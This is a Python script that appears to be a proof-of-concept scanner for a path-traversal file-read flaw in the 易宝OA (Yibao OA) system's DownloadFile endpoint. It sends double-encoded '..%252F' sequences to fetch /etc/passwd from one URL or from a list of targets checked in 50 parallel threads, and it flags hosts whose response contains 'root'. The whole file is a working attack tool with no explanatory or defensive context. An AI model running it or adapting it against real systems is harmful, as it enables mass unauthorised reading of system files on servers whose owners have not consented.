import requests
import argparse
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description="易宝OA系统DownloadFile接口文件读取漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    pool = Pool(50)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            args.url = f"http://{args.url}"
            check(args.url)
    elif args.file:
        f = open(args.file, 'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)
        pool.map(check, targets)
        pool.close()


def check(target):
    url = f"{target}/download/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd"
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Connection':'close',
        'Accept-Encoding':'gzip'
    }


    response = requests.post(url, headers=headers, verify=False, timeout=3)
    try:
        if response.status_code == 200 and 'root' in response.text:
            print(f"[*] {target} 存在漏洞")
        else:
            print(f"[!] {target} 不存在漏洞")
    except Exception as e:
        print(f"[Error] {target} TimeOut")


if __name__ == '__main__':
    main()